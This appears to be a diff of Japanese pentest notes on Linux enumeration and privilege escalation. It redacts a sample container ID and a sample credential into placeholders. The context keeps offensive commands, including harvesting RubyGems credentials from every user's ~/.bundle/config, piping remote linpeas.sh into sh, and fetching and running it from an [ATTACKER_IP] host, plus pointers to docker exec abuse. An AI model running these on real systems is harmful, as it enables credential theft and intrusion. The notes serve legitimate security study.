@@ -109,7 +109,7 @@ netstat -tlnp 2>/dev/null
 # 方法1: /etc/hosts でホスト名と IP を確認
 cat /etc/hosts
 # ホスト名がランダムな16進文字列 かつ IPが 172.17.0.x → Docker コンテナ
-# 例: 172.17.0.2   e6ff5b1cbc85
+# 例: 172.17.0.2   [CONTAINER_ID]
 
 # 方法2: 自分の IP アドレスを確認
 ip addr show
@@ -138,7 +138,7 @@ cat /proc/self/status | grep -i "capeff\|capbnd"
 ```
 
 **コンテナIDはホストへの sudo docker exec 悪用時に必要：**
-`/etc/hosts` のホスト名（例: `e6ff5b1cbc85`）がコンテナIDとして使える。
+`/etc/hosts` のホスト名（例: `[CONTAINER_ID]`）がコンテナIDとして使える。
 
 → sudo docker exec の悪用: `Sudo_Misconfig.md`（パターン4）
 → IPレンジと環境の対応: `../01_Reconnaissance/Network_Scanning.md`（IPアドレスレンジから環境を読む）
@@ -174,8 +174,8 @@ cat ~/.ssh/
 ```bash
 # [Target] Bundler の設定ファイル（RubyGems 認証情報が平文で入っていることがある）
 cat ~/.bundle/config
-# 出力例: BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
-#   → "henry:Q3c1AqGHtoI0aXAYFH" のうち前半がユーザー名、後半がパスワード
+# 出力例: BUNDLE_HTTPS://RUBYGEMS__ORG/: "[USER]:[PASSWORD]"
+#   → "[USER]:[PASSWORD]" のうち前半がユーザー名、後半がパスワード
 
 # 全ユーザーのホームディレクトリを一括確認
 for u in $(ls /home/); do echo "=== $u ==="; cat /home/$u/.bundle/config 2>/dev/null; done
@@ -247,8 +247,8 @@ rpm -qa 2>/dev/null | head -50
 # LinPEAS（最も網羅的）
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 # ターゲットからインターネットに出られない場合（閉じたネットワーク）:
-# [Kali] python3 -m http.server 8000 でHTTPサーバーを起動し
-# [Target] wget http://[KALI_IP]:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
+# [Attacker] python3 -m http.server 8000 でHTTPサーバーを起動し
+# [Target] wget http://[ATTACKER_IP]:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
 # → ファイル転送の詳細: Kernel_Exploits.md のファイル転送パターンを参照
 
 # LinEnum
